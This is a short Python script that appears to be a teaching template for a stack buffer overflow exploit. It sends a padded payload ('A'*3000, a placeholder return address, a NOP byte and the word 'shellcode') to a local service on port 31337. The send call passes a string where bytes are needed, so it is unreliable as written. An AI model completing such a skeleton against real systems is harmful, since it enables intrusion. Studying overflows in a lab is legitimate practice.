import socket


def send_buffer_overflow(my_buf):    
    # Set up IP and PORT we1re connecting to
    RHOST = '127.0.0.1'
    RPORT = 31337

    # Create a TCP connection (socket)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # Send the happy little message down the socket
    s.send(my_buf)

    # Print out what we sent
    print( f'Sent: {my_buf}')

    # Recive same data from the socket
    data = s.recv(1024)

    # Print out what we received
    print(f'Received: {data}')

if (__name__ == '__main__'):
    # Build a happy little message folloewd by a newline
    buf = 'A'*3000 + 'IBP' + '\x90' + 'shellcode'
    buf += 'Python Script'
    buf += '\n'

    send_buffer_overflow(buf)